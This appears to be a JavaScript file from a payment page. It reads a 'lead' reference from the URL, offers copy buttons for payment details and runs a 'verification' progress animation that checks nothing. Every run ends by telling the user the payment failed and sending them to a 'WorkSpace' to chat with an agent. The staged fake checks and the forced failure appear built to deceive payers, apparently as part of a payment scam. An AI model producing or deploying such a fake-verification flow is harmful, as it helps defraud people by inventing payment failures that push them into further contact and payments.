const paymentLead = (() => {
  const params = new URLSearchParams(window.location.search || '');
  const lead = params.get('lead') || 'NP-UNCONFIRMED';
  const source = params.get('source') || 'afd';
  return { lead, source };
})();

const leadSummary = document.getElementById('lead-summary');
const paymentLeadText = paymentLead.lead ? `Assessment reference: ${paymentLead.lead}` : 'Assessment reference: NP-UNCONFIRMED';
if (leadSummary) {
  leadSummary.textContent = paymentLeadText;
}

const modal = document.getElementById('verification-modal');
const progressLabel = document.getElementById('progress-label');
const progressFill = document.getElementById('progress-fill');
const modalMessage = document.getElementById('modal-message');
const verifyButton = document.getElementById('verify-button');
const paymentMethod = document.getElementById('payment-method');
const paymentOptions = document.querySelectorAll('[data-payment-option]');

function showPaymentMethod(method) {
  paymentOptions.forEach((option) => {
    option.hidden = option.dataset.paymentOption !== method;
  });
}

if (paymentMethod) {
  showPaymentMethod(paymentMethod.value);
  paymentMethod.addEventListener('change', (event) => showPaymentMethod(event.target.value));
}

function showModal() {
  if (!modal) return;
  modal.classList.remove('hidden');
  modal.setAttribute('aria-hidden', 'false');
}

function hideModal() {
  if (!modal) return;
  modal.classList.add('hidden');
  modal.setAttribute('aria-hidden', 'true');
}

function setProgress(value) {
  const safeValue = Math.min(100, Math.max(1, value));
  if (progressFill) {
    progressFill.style.width = `${safeValue}%`;
  }
  if (progressLabel) {
    progressLabel.textContent = `${Math.round(safeValue)}%`;
  }
}

function startVerification() {
  if (!verifyButton) return;
  verifyButton.disabled = true;
  verifyButton.textContent = 'Verifying...';
  showModal();
  setProgress(1);
  modalMessage.textContent = 'Checking the transfer details.';

  let step = 1;
  const interval = setInterval(() => {
    step += 7;
    setProgress(step);

    if (step < 30) {
      modalMessage.textContent = 'Validating the transfer details.';
      return;
    }

    if (step < 60) {
      modalMessage.textContent = 'Confirming the payment source.';
      return;
    }

    if (step < 100) {
      modalMessage.textContent = 'Finalizing the verification record.';
      return;
    }

    clearInterval(interval);
    modalMessage.textContent = "Your payment isn't successful, please go to the WorkSpace to chat an Agent and Verify your payment manually";
    verifyButton.textContent = 'Verification Complete';
    verifyButton.disabled = true;
    const workspaceLink = document.getElementById('workspace-link');
    if (workspaceLink) {
      workspaceLink.style.display = 'inline-flex';
    }
  }, 350);
}

async function copyToClipboard(text) {
  try {
    if (navigator.clipboard && window.isSecureContext) {
      await navigator.clipboard.writeText(text);
      return true;
    }

    const helper = document.createElement('textarea');
    helper.value = text;
    helper.setAttribute('readonly', '');
    helper.style.position = 'fixed';
    helper.style.top = '-9999px';
    document.body.appendChild(helper);
    helper.select();
    const successful = document.execCommand('copy');
    document.body.removeChild(helper);
    return successful;
  } catch (error) {
    console.error('Copy failed', error);
    return false;
  }
}

document.querySelectorAll('.copy-button').forEach((button) => {
  button.addEventListener('click', async () => {
    const value = button.dataset.copy || '';
    const previousText = button.textContent;
    const copied = await copyToClipboard(value);
    button.textContent = copied ? 'Copied' : 'Try again';
    window.setTimeout(() => {
      button.textContent = previousText;
    }, 1200);
  });
});

if (verifyButton) {
  verifyButton.addEventListener('click', startVerification);
}

document.querySelectorAll('[data-close-modal="true"]').forEach((button) => {
  button.addEventListener('click', hideModal);
});

window.addEventListener('keydown', (event) => {
  if (event.key === 'Escape' && modal && !modal.classList.contains('hidden')) {
    hideModal();
  }
});

if (window.location.search.includes('lead=')) {
  if (leadSummary) {
    leadSummary.textContent = `${leadSummary.textContent} · Referral ID ${paymentLead.lead}`;
  }
}
